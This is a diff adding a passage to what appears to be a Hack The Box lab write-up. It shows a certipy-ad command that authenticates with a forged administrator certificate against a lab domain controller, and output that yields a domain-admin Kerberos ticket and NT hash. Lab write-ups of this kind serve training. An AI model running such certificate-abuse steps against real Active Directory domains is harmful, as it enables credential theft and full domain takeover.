@@ -1118,6 +1118,25 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 Then using the certipy wiki i can follow the steps
 
 ```python
+❯❯❯ faketime '2026-11-20 03:26:17.607170' certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.190 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@coder.htb'
+[*]     SAN URL SID: 'S-1-5-21-2608251805-3526430372-1546376444-500'
+[*]     Security Extension SID: 'S-1-5-21-2608251805-3526430372-1546376444-500'
+[*] Using principal: 'administrator@coder.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@coder.htb': aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7
+```
+
+I now have a DA tgt and a admin hash
+
+```python
 
 ```
 
